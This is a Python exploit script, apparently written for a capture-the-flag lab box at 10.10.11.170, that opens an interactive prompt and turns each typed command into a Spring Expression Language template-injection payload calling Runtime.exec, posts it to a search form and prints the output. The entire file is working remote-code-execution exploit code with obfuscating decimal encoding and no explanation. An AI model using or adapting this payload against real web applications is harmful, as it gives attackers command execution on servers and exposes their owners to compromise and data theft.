#!/usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse
import requests

target_url='http://10.10.11.170:8080/search'

class Terminal(Cmd):
    prompt='\033[1;33mCommand ==>\033[0m '
    def send_payload(self,payload):
        data = { "name": payload }
        r = requests.post(target_url, data=data)
        content = str(r.content)
        content = content[content.find(':')+2:content.find('<',content.find(':'))-2]
        print(content.replace(r'\n', '\n').replace(r'\t', '\t'))
    
    def decimal_encode(self,args):
        command=args

        decimals=[]

        for i in command:
            decimals.append(str(ord(i)))

        payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
        

        for i in decimals[1:]:
            line='.concat(T(java.lang.Character).toString({}))'.format(i)
            payload+=line

        payload+=').getInputStream())}'
        self.send_payload(payload)
        '''if url_encode:
            payload_encoded=urllib.parse.quote_plus(payload,safe='')
            return payload_encoded
        else:
            return payload'''

    def default(self,args):
        self.decimal_encode(args)
        print()
try:
    term=Terminal()
    term.cmdloop()
except KeyboardInterrupt:
    quit()